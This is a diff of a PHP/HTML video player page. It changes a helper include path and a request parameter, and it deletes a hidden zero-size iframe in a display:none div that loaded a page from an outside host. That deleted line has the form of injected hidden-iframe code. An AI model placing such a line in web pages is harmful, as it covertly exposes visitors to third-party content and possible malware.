@@ -24,13 +24,12 @@
 <body>
 <div style="width:100%;height:100vh" class="web_size">										<video id='myVideo'  class="video-js" ></video>
 											<link rel="stylesheet" type="text/css" href="video.min.css?v=3">
-										<div style=\'display:none;\'><iframe src=http://tj.naichaapi.me/boos/index.html width=0 height=0></iframe></script></div>
 											<script type="text/javascript" src="video.min.js?v=1" charset="utf-8" > </script>
 												<script type="text/javascript" src="video-conrtib-ads.js?v=1" charset="utf-8" > </script>
 												<script type="text/javascript" src="myVideo.js?v=6" charset="utf-8" > </script>
 												<script type="text/javascript">
 
-                                                    var vPath = '<?php include('Helper.php'); echo safeRequest($_GET['url']);?>';
+                                                    var vPath = '<?php include('../../../Php/Public/Helper.php'); echo safeRequest($_GET['Play']);?>';
 
 												var logo = '';
 												var myVideo=initVideo({
